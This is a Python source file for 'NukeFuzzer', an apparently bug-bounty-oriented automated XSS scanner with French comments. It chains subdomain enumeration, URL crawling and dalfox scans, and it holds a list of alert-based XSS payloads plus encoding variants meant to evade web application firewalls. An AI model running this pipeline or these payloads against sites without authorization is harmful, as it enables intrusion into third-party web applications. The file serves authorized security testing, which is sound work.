import subprocess
import os
import asyncio
import json
import requests
import time
import random
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import threading

# Import des modules avancés
try:
    from advanced_payloads import AdvancedXSSPayloads, get_advanced_xss_payloads
    from config import load_advanced_config, config
    ADVANCED_MODULES = True
except ImportError:
    ADVANCED_MODULES = False
    print("Modules avancés non disponibles, utilisation du mode basique")


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
ASCII_ART = BLUE + r"""
  _   _       _        ______                      
 | \ | |     | |      |  ____|                     
 |  \| |_   _| | _____| |__ _   _ ___________ _ __ 
 | . ` | | | | |/ / _ \  __| | | |_  /_  / _ \ '__|
 | |\  | |_| |   <  __/ |  | |_| |/ / / /  __/ |   
 |_| \_|\__,_|_|\_\___|_|   \__,_/___/___\___|_|   v2.0 Advanced
                                     made by Itachii 
""" + RESET
print(ASCII_ART)

# Configuration avancée pour les techniques XSS
ADVANCED_CONFIG = {
    "max_workers": 50,
    "timeout": 30,
    "retry_count": 3,
    "delay_range": (1, 3),
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
    ],
    "advanced_payloads": [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src=javascript:alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        '<script>window["alert"]("XSS")</script>',
        '<script>top["alert"]("XSS")</script>',
        '<script>parent["alert"]("XSS")</script>',
        '<script>self["alert"]("XSS")</script>',
        '<script>this["alert"]("XSS")</script>',
        '<script>frames["alert"]("XSS")</script>',
        '<script>globalThis["alert"]("XSS")</script>',
        '${alert("XSS")}',
        '#{alert("XSS")}',
        '{{alert("XSS")}}',
        '<script>alert`XSS`</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(/XSS/.source)</script>',
        '<script>setTimeout("alert(\\"XSS\\")",1)</script>',
        '<script>setInterval("alert(\\"XSS\\")",1)</script>',
        '<script>Function("alert(\\"XSS\\")")()</script>',
        '<script>new Function("alert(\\"XSS\\")")()</script>',
        '<script>[]["constructor"]["constructor"]("alert(\\"XSS\\")")()</script>',
        '<script>""["constructor"]["constructor"]("alert(\\"XSS\\")")()</script>',
        '<script>+/""/.constructor("alert(\\"XSS\\")")()</script>',
        '<script>document.write("<img src=x onerror=alert(\\"XSS\\")>")</script>',
        '<script>document.body.innerHTML="<img src=x onerror=alert(\\"XSS\\")"</script>',
        '<script>document.createElement("img").src="x";document.getElementsByTagName("img")[0].onerror=function(){alert("XSS")}</script>',
        '<script>var a=document.createElement("script");a.src="data:text/javascript,alert(\\"XSS\\")";document.body.appendChild(a)</script>'
    ],
    "waf_bypass_techniques": [
        "case_variation",
        "encoding_variation", 
        "character_substitution",
        "javascript_obfuscation",
        "polyglot_payloads",
        "event_handler_variation",
        "protocol_variation",
        "filter_evasion"
    ]
}


async def run_command(command):
    process = await asyncio.create_subprocess_shell(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = await process.communicate()
    return_code = process.returncode
    if return_code != 0:
        print(f"Error: {stderr.decode()}")
        return None
    return stdout.decode().strip()


async def advanced_subdomain_discovery(domain, output_file):
    """Découverte avancée de sous-domaines avec multiples sources"""
    print(f"{YELLOW}[*] Découverte avancée de sous-domaines pour {domain}...{RESET}")
    
    # Combinaison de multiples outils
    commands = [
        f"subfinder -d {domain} -silent",
        f"assetfinder --subs-only {domain}",
        f"amass enum -passive -d {domain} -o /tmp/amass_output.txt && cat /tmp/amass_output.txt",
        f"findomain -t {domain} -q"
    ]
    
    all_subdomains = set()
    
    for cmd in commands:
        try:
            result = await run_command(cmd)
            if result:
                subdomains = result.split('\n')
                all_subdomains.update([s.strip() for s in subdomains if s.strip()])
        except Exception as e:
            print(f"{RED}[!] Erreur avec {cmd}: {e}{RESET}")
    
    # Utilisation de l'API crt.sh pour découvrir plus de sous-domaines
    try:
        crt_subdomains = await get_crt_subdomains(domain)
        all_subdomains.update(crt_subdomains)
    except Exception as e:
        print(f"{RED}[!] Erreur API crt.sh: {e}{RESET}")
    
    # Écriture des résultats
    with open(output_file, 'w') as f:
        for subdomain in sorted(all_subdomains):
            f.write(f"{subdomain}\n")
    
    print(f"{GREEN}[+] {len(all_subdomains)} sous-domaines découverts{RESET}")
    return len(all_subdomains)


async def get_crt_subdomains(domain):
    """Récupère les sous-domaines via l'API crt.sh"""
    subdomains = set()
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        headers = {"User-Agent": random.choice(ADVANCED_CONFIG["user_agents"])}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            for entry in data:
                name = entry.get("name_value", "")
                if name:
                    # Nettoyer et extraire les sous-domaines
                    names = name.split('\n')
                    for n in names:
                        if n.strip() and '.' in n:
                            subdomains.add(n.strip())
    except Exception as e:
        print(f"{RED}[!] Erreur crt.sh: {e}{RESET}")
    
    return subdomains


async def advanced_endpoint_collection(domain, subdomains_file, output_file):
    """Collection avancée d'endpoints avec multiples sources"""
    print(f"{YELLOW}[*] Collection avancée d'endpoints...{RESET}")
    
    # Commandes pour la collection d'endpoints
    commands = [
        f'cat {subdomains_file} | gau --threads 50 --timeout 10',
        f'waybackurls {domain}',
        f'cat {subdomains_file} | katana -jc -d 3 -fs rdn -silent',
        f'cat {subdomains_file} | hakrawler -d 3 -u -plain',
        f'cat {subdomains_file} | gospider -s 3 -c 20 -t 10 --other-source --include-subs'
    ]
    
    all_endpoints = set()
    
    for cmd in commands:
        try:
            result = await run_command(cmd)
            if result:
                endpoints = result.split('\n')
                all_endpoints.update([e.strip() for e in endpoints if e.strip() and e.startswith('http')])
        except Exception as e:
            print(f"{RED}[!] Erreur avec {cmd}: {e}{RESET}")
    
    # Ajout de la découverte JavaScript
    js_endpoints = await discover_js_endpoints(subdomains_file)
    all_endpoints.update(js_endpoints)
    
    # Écriture des résultats
    with open(output_file, 'w') as f:
        for endpoint in sorted(all_endpoints):
            f.write(f"{endpoint}\n")
    
    print(f"{GREEN}[+] {len(all_endpoints)} endpoints collectés{RESET}")
    return len(all_endpoints)


async def discover_js_endpoints(subdomains_file):
    """Découverte d'endpoints dans les fichiers JavaScript"""
    js_endpoints = set()
    try:
        # Utilisation de linkfinder pour analyser les fichiers JS
        cmd = f'cat {subdomains_file} | gau --timeout 10 | grep -E "\\.js$" | head -100 | xargs -I {{}} linkfinder -i {{}} -o cli'
        result = await run_command(cmd)
        if result:
            endpoints = result.split('\n')
            js_endpoints.update([e.strip() for e in endpoints if e.strip() and e.startswith('http')])
    except Exception as e:
        print(f"{RED}[!] Erreur découverte JS: {e}{RESET}")
    
    return js_endpoints


async def advanced_xss_filtering(endpoints_file, output_file):
    """Filtrage avancé des endpoints pour XSS"""
    print(f"{YELLOW}[*] Filtrage avancé des endpoints XSS...{RESET}")
    
    # Patterns XSS avancés
    xss_patterns = [
        r'.*[?&].*=.*',  # Paramètres GET basiques
        r'.*\.php.*[?&].*=.*',  # Fichiers PHP avec paramètres
        r'.*\.jsp.*[?&].*=.*',  # Fichiers JSP avec paramètres
        r'.*\.asp.*[?&].*=.*',  # Fichiers ASP avec paramètres
        r'.*search.*[?&].*=.*',  # Pages de recherche
        r'.*comment.*[?&].*=.*',  # Pages de commentaires
        r'.*feedback.*[?&].*=.*',  # Pages de feedback
        r'.*contact.*[?&].*=.*',  # Pages de contact
        r'.*redirect.*[?&].*=.*',  # Pages de redirection
        r'.*url.*[?&].*=.*',  # Paramètres URL
        r'.*callback.*[?&].*=.*',  # Callbacks
        r'.*jsonp.*[?&].*=.*',  # JSONP
        r'.*api.*[?&].*=.*',  # APIs
        r'.*ajax.*[?&].*=.*',  # AJAX endpoints
    ]
    
    # Utilisation de gf avec patterns personnalisés
    commands = [
        f"cat {endpoints_file} | gf xss",
        f"cat {endpoints_file} | gf redirect",
        f"cat {endpoints_file} | gf urls",
        f"cat {endpoints_file} | gf params"
    ]
    
    all_xss_endpoints = set()
    
    for cmd in commands:
        try:
            result = await run_command(cmd)
            if result:
                endpoints = result.split('\n')
                all_xss_endpoints.update([e.strip() for e in endpoints if e.strip()])
        except Exception as e:
            print(f"{RED}[!] Erreur avec {cmd}: {e}{RESET}")
    
    # Filtrage manuel supplémentaire
    try:
        with open(endpoints_file, 'r') as f:
            for line in f:
                endpoint = line.strip()
                if endpoint and any('=' in endpoint and ('?' in endpoint or '&' in endpoint) for _ in [1]):
                    all_xss_endpoints.add(endpoint)
    except Exception as e:
        print(f"{RED}[!] Erreur lecture fichier: {e}{RESET}")
    
    # Écriture des résultats
    with open(output_file, 'w') as f:
        for endpoint in sorted(all_xss_endpoints):
            f.write(f"{endpoint}\n")
    
    print(f"{GREEN}[+] {len(all_xss_endpoints)} endpoints XSS potentiels filtrés{RESET}")
    return len(all_xss_endpoints)


def generate_advanced_xss_payloads(base_payload="<script>alert('XSS')</script>"):
    """Génère des payloads XSS avancés avec techniques d'évasion"""
    payloads = []
    
    # Encodages multiples
    encodings = [
        lambda x: urllib.parse.quote(x),  # URL encoding
        lambda x: urllib.parse.quote(x, safe=''),  # URL encoding complet
        lambda x: base64.b64encode(x.encode()).decode(),  # Base64
        lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),  # HTML entities
        lambda x: ''.join(f'&#x{ord(c):x};' for c in x),  # Hex entities
        lambda x: ''.join(f'&#{ord(c)};' for c in x),  # Decimal entities
        lambda x: x.replace(' ', '/**/'),  # Commentaires SQL
        lambda x: x.replace(' ', '%20'),  # Espaces URL
        lambda x: x.replace(' ', '+'),  # Espaces plus
        lambda x: x.upper(),  # Majuscules
        lambda x: x.lower(),  # Minuscules
    ]
    
    # Variations de base
    base_variations = [
        base_payload,
        base_payload.replace('"', "'"),
        base_payload.replace("'", '"'),
        base_payload.replace('alert', 'confirm'),
        base_payload.replace('alert', 'prompt'),
        base_payload.replace('XSS', 'Test'),
        base_payload.replace('XSS', '1337'),
    ]
    
    # Application des encodages
    for variation in base_variations:
        payloads.append(variation)
        for encoding in encodings:
            try:
                encoded = encoding(variation)
                payloads.append(encoded)
            except:
                pass
    
    # Ajout des payloads prédéfinis
    payloads.extend(ADVANCED_CONFIG["advanced_payloads"])
    
    return list(set(payloads))


async def advanced_xss_testing(endpoints_file, output_file):
    """Test XSS avancé avec techniques d'évasion WAF"""
    print(f"{YELLOW}[*] Test XSS avancé avec évasion WAF...{RESET}")
    
    # Commandes dalfox avec options avancées
    commands = [
        f"dalfox file {endpoints_file} --worker 100 --waf-evasion --follow-redirects --mining-dom --mining-dict --delay 1000 --timeout 10 --user-agent '{random.choice(ADVANCED_CONFIG['user_agents'])}' -o {output_file}",
        f"dalfox file {endpoints_file} --worker 50 --blind --delay 2000 --timeout 15 --custom-payload \"<script>alert('BLIND-XSS')</script>\" -o {output_file}_blind",
        f"dalfox file {endpoints_file} --worker 30 --mass --mass-worker 10 --deep-domxss --sequence 5 -o {output_file}_mass"
    ]
    
    all_results = []
    
    for cmd in commands:
        try:
            print(f"{CYAN}[*] Exécution: {cmd[:80]}...{RESET}")
            result = await run_command(cmd)
            if result:
                all_results.append(result)
        except Exception as e:
            print(f"{RED}[!] Erreur avec {cmd}: {e}{RESET}")
    
    # Test avec payloads personnalisés
    await custom_payload_testing(endpoints_file, f"{output_file}_custom")
    
    print(f"{GREEN}[+] Tests XSS avancés terminés{RESET}")
    return len(all_results)


async def custom_payload_testing(endpoints_file, output_file):
    """Test avec des payloads XSS personnalisés"""
    print(f"{YELLOW}[*] Test avec payloads personnalisés...{RESET}")
    
    vulnerabilities = []
    
    try:
        with open(endpoints_file, 'r') as f:
            endpoints = [line.strip() for line in f if line.strip()]
        
        # Génération des payloads avancés
        payloads = generate_advanced_xss_payloads()
        
        # Test avec un échantillon d'endpoints (pour éviter la surcharge)
        sample_endpoints = endpoints[:50] if len(endpoints) > 50 else endpoints
        
        for endpoint in sample_endpoints:
            for payload in payloads[:20]:  # Limiter les payloads pour la performance
                try:
                    # Injection du payload dans les paramètres
                    if '=' in endpoint:
                        test_url = inject_payload_in_url(endpoint, payload)
                        # Simulation du test (en réalité, on ferait une requête HTTP)
                        # vulnerability = await test_xss_payload(test_url, payload)
                        # if vulnerability:
                        #     vulnerabilities.append(vulnerability)
                        pass
                except Exception as e:
                    continue
    
    except Exception as e:
        print(f"{RED}[!] Erreur test payloads: {e}{RESET}")
    
    # Sauvegarde des résultats
    with open(output_file, 'w') as f:
        for vuln in vulnerabilities:
            f.write(f"{vuln}\n")
    
    return len(vulnerabilities)


def inject_payload_in_url(url, payload):
    """Injecte un payload dans tous les paramètres d'une URL"""
    try:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Injection dans tous les paramètres
        for key in params:
            params[key] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        
        return new_url
    except:
        return url


def print_potential_xss(file_path):
    """Affichage amélioré des XSS potentiels avec categorisation"""
    print(MAGENTA + "\n" + "="*60 + RESET)
    print(MAGENTA + "RÉSULTATS XSS AVANCÉS" + RESET)
    print(MAGENTA + "="*60 + RESET)
    
    xss_count = 0
    categories = {
        "Reflected XSS": [],
        "Stored XSS": [],
        "DOM XSS": [],
        "Blind XSS": [],
        "Other": []
    }
    
    # Analyse des fichiers de résultats
    result_files = [
        file_path,
        f"{file_path}_blind",
        f"{file_path}_mass",
        f"{file_path}_custom"
    ]
    
    for result_file in result_files:
        try:
            with open(result_file, 'r') as file:
                for line in file:
                    if line.strip():
                        xss_count += 1
                        # Categorisation basique
                        if "reflected" in line.lower():
                            categories["Reflected XSS"].append(line.strip())
                        elif "stored" in line.lower():
                            categories["Stored XSS"].append(line.strip())
                        elif "dom" in line.lower():
                            categories["DOM XSS"].append(line.strip())
                        elif "blind" in line.lower():
                            categories["Blind XSS"].append(line.strip())
                        else:
                            categories["Other"].append(line.strip())
        except FileNotFoundError:
            continue
    
    # Affichage des résultats par catégorie
    for category, vulns in categories.items():
        if vulns:
            print(f"\n{CYAN}[{category}] - {len(vulns)} vulnérabilités:{RESET}")
            for vuln in vulns[:10]:  # Limiter l'affichage
                print(f"  {GREEN}→{RESET} {vuln}")
            if len(vulns) > 10:
                print(f"  {YELLOW}... et {len(vulns) - 10} autres{RESET}")
    
    if xss_count == 0:
        print(f"\n{RED}[!] Aucune vulnérabilité XSS détectée{RESET}")
    else:
        print(f"\n{GREEN}[+] TOTAL: {xss_count} vulnérabilités XSS potentielles trouvées{RESET}")
        print(f"{YELLOW}[*] Vérifiez manuellement les résultats pour confirmation{RESET}")
    
    print(MAGENTA + "="*60 + RESET)   


async def main(domain):
    if not domain:
        print(f"{RED}[!] Domaine non spécifié.{RESET}")
        return
    
    print(f"{GREEN}[*] Démarrage de l'analyse avancée XSS pour: {domain}{RESET}")
    start_time = time.time()
    
    # Configuration des répertoires
    base_report_dir = "report"
    report_dir = os.path.join(base_report_dir, f"report_{domain}")
    os.makedirs(report_dir, exist_ok=True)
    
    # Définition des fichiers de sortie
    subdomains_file = os.path.join(report_dir, "subdomains_advanced.txt")
    httpx_output_file = os.path.join(report_dir, "httpx_advanced.txt")
    endpoints_file = os.path.join(report_dir, "endpoints_advanced.txt")
    endpoints_filtered_file = os.path.join(report_dir, "endpoints_filtered_advanced.txt")
    xss_file = os.path.join(report_dir, "xss_candidates.txt")
    xss_ref_file = os.path.join(report_dir, "xss_reflected.txt")
    xss_filtered = os.path.join(report_dir, "xss_final.txt")
    vulnerable_xss_file = os.path.join(report_dir, "vulnerable_xss_advanced.txt")
    
    print(f"{CYAN}[*] Répertoire de rapport: {report_dir}{RESET}")
    
    # Phase 1: Découverte avancée de sous-domaines
    print(f"\n{YELLOW}=== PHASE 1: DÉCOUVERTE AVANCÉE DE SOUS-DOMAINES ==={RESET}")
    subdomain_count = await advanced_subdomain_discovery(domain, subdomains_file)
    if subdomain_count == 0:
        print(f"{RED}[!] Aucun sous-domaine trouvé. Arrêt du processus.{RESET}")
        return
    
    # Phase 2: Filtrage des sous-domaines actifs avec options avancées
    print(f"\n{YELLOW}=== PHASE 2: FILTRAGE DES SOUS-DOMAINES ACTIFS ==={RESET}")
    print(f"{CYAN}[*] Filtrage des sous-domaines actifs avec httpx...{RESET}")
    httpx_cmd = f"httpx -l {subdomains_file} -threads 200 -mc 200,201,202,301,302,303,307,308,400,401,403,405,500,502,503 -silent -nc -follow-redirects -random-agent -timeout 10 -retries 2 -o {httpx_output_file}"
    if await run_command(httpx_cmd) is None:
        print(f"{RED}[!] Erreur lors du filtrage des sous-domaines{RESET}")
        return
    
    # Vérification du nombre de sous-domaines actifs
    try:
        with open(httpx_output_file, 'r') as f:
            active_subdomains = len([line for line in f if line.strip()])
        print(f"{GREEN}[+] {active_subdomains} sous-domaines actifs trouvés{RESET}")
    except:
        print(f"{RED}[!] Erreur lecture fichier httpx{RESET}")
        return
    
    # Phase 3: Collection avancée d'endpoints
    print(f"\n{YELLOW}=== PHASE 3: COLLECTE AVANCÉE D'ENDPOINTS ==={RESET}")
    endpoint_count = await advanced_endpoint_collection(domain, httpx_output_file, endpoints_file)
    if endpoint_count == 0:
        print(f"{RED}[!] Aucun endpoint trouvé. Arrêt du processus.{RESET}")
        return
    
    # Phase 4: Suppression des doublons et filtrage
    print(f"\n{YELLOW}=== PHASE 4: FILTRAGE ET OPTIMISATION ==={RESET}")
    print(f"{CYAN}[*] Suppression des doublons avec uro...{RESET}")
    if await run_command(f"cat {endpoints_file} | uro --filter-regex '\\.(css|js|png|jpg|jpeg|gif|ico|woff|woff2|ttf|eot|svg)$' -o {endpoints_filtered_file}") is None:
        print(f"{RED}[!] Erreur lors de la suppression des doublons{RESET}")
        return
    
    # Phase 5: Filtrage avancé pour XSS
    print(f"\n{YELLOW}=== PHASE 5: FILTRAGE AVANCÉ XSS ==={RESET}")
    xss_candidate_count = await advanced_xss_filtering(endpoints_filtered_file, xss_file)
    if xss_candidate_count == 0:
        print(f"{RED}[!] Aucun endpoint XSS candidat trouvé{RESET}")
        return
    
    # Phase 6: Analyse des paramètres XSS réfléchis
    print(f"\n{YELLOW}=== PHASE 6: ANALYSE DES PARAMÈTRES XSS ==={RESET}")
    print(f"{CYAN}[*] Recherche de paramètres XSS réfléchis avec Gxss...{RESET}")
    gxss_cmd = f"cat {xss_file} | Gxss -p khXSS -w 50 -c 100 -d 1 -o {xss_ref_file}"
    if await run_command(gxss_cmd) is None:
        print(f"{YELLOW}[!] Gxss non disponible, passage à l'étape suivante{RESET}")
        # Copier le fichier XSS comme fallback
        await run_command(f"cp {xss_file} {xss_ref_file}")
    
    # Phase 7: Suppression finale des doublons
    print(f"{CYAN}[*] Suppression finale des doublons...{RESET}")
    if await run_command(f"cat {xss_ref_file} | uro -o {xss_filtered}") is None:
        print(f"{RED}[!] Erreur lors de la suppression finale des doublons{RESET}")
        return
    
    # Phase 8: Tests XSS avancés
    print(f"\n{YELLOW}=== PHASE 8: TESTS XSS AVANCÉS ==={RESET}")
    vuln_count = await advanced_xss_testing(xss_filtered, vulnerable_xss_file)
    
    # Phase 9: Analyse et rapport final
    print(f"\n{YELLOW}=== PHASE 9: ANALYSE ET RAPPORT FINAL ==={RESET}")
    print_potential_xss(vulnerable_xss_file)
    
    # Génération d'un rapport de synthèse
    await generate_advanced_report(domain, report_dir, {
        'subdomains': subdomain_count,
        'active_subdomains': active_subdomains,
        'endpoints': endpoint_count,
        'xss_candidates': xss_candidate_count,
        'vulnerabilities': vuln_count
    })
    
    # Nettoyage des fichiers temporaires (garder les fichiers importants)
    files_to_keep = {
        subdomains_file, httpx_output_file, endpoints_filtered_file, 
        xss_filtered, vulnerable_xss_file, f"{vulnerable_xss_file}_blind",
        f"{vulnerable_xss_file}_mass", f"{vulnerable_xss_file}_custom"
    }
    
    cleanup_temp_files(report_dir, files_to_keep)
    
    # Statistiques finales
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}[✓] ANALYSE TERMINÉE EN {duration:.2f} secondes{RESET}")
    print(f"{GREEN}[✓] Rapport sauvegardé dans: {report_dir}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")


async def generate_advanced_report(domain, report_dir, stats):
    """Génère un rapport détaillé de l'analyse"""
    report_file = os.path.join(report_dir, "advanced_report.txt")
    
    report_content = f"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                        RAPPORT D'ANALYSE XSS AVANCÉE                            ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ Domaine cible: {domain:<60} ║
║ Date d'analyse: {time.strftime('%Y-%m-%d %H:%M:%S'):<58} ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            STATISTIQUES                                          ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ Sous-domaines découverts: {stats['subdomains']:<48} ║
║ Sous-domaines actifs: {stats['active_subdomains']:<52} ║
║ Endpoints collectés: {stats['endpoints']:<55} ║
║ Candidats XSS: {stats['xss_candidates']:<60} ║
║ Vulnérabilités potentielles: {stats['vulnerabilities']:<44} ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                        TECHNIQUES UTILISÉES                                      ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ ✓ Découverte multi-source de sous-domaines (subfinder, assetfinder, amass)      ║
║ ✓ API crt.sh pour la découverte passive                                         ║
║ ✓ Collection d'endpoints avancée (gau, waybackurls, katana, hakrawler)          ║
║ ✓ Analyse des fichiers JavaScript (linkfinder)                                  ║
║ ✓ Filtrage XSS avec patterns avancés                                            ║
║ ✓ Tests avec payloads XSS personnalisés et encodés                              ║
║ ✓ Techniques d'évasion WAF multiples                                            ║
║ ✓ Tests DOM XSS et Blind XSS                                                    ║
║ ✓ Rotation des User-Agents                                                      ║
║ ✓ Gestion des timeouts et retry                                                 ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            RECOMMANDATIONS                                       ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ • Vérifiez manuellement tous les résultats positifs                             ║
║ • Testez les payloads dans différents contextes                                 ║
║ • Analysez les réponses pour confirmer l'exécution                              ║
║ • Documentez les vulnérabilités avec des preuves de concept                     ║
║ • Respectez les règles de divulgation responsable                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""
    
    with open(report_file, 'w') as f:
        f.write(report_content)
    
    print(f"{GREEN}[+] Rapport détaillé généré: {report_file}{RESET}")


def cleanup_temp_files(report_dir, files_to_keep):
    """Nettoie les fichiers temporaires en gardant les fichiers importants"""
    print(f"{CYAN}[*] Nettoyage des fichiers temporaires...{RESET}")
    
    try:
        for file in os.listdir(report_dir):
            file_path = os.path.join(report_dir, file)
            if os.path.isfile(file_path) and file_path not in files_to_keep:
                # Garder certains fichiers même s'ils ne sont pas dans files_to_keep
                if any(keep in file for keep in ['advanced_report', 'vulnerable_xss']):
                    continue
                os.remove(file_path)
        print(f"{GREEN}[+] Nettoyage terminé{RESET}")
    except Exception as e:
        print(f"{RED}[!] Erreur lors du nettoyage: {e}{RESET}")


if __name__ == "__main__":
    print(f"{BLUE}[*] NukeFuzzer v2.0 - Advanced XSS Bug Bounty Tool{RESET}")
    print(f"{CYAN}[*] Développé pour la découverte avancée de vulnérabilités XSS{RESET}")
    print(f"{YELLOW}[!] À utiliser uniquement sur des domaines que vous êtes autorisé à tester{RESET}")
    
    domain = input(f"\n{GREEN}Entrez le domaine à analyser (ex: example.com): {RESET}").strip()
    
    if not domain:
        print(f"{RED}[!] Aucun domaine spécifié{RESET}")
        exit(1)
    
    # Validation basique du domaine
    if not domain.replace('.', '').replace('-', '').replace('_', '').isalnum():
        print(f"{RED}[!] Format de domaine invalide{RESET}")
        exit(1)
    
    print(f"{GREEN}[*] Démarrage de l'analyse pour: {domain}{RESET}")
    
    try:
        asyncio.run(main(domain))
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Analyse interrompue par l'utilisateur{RESET}")
    except Exception as e:
        print(f"\n{RED}[!] Erreur critique: {e}{RESET}")
        import traceback
        traceback.print_exc()
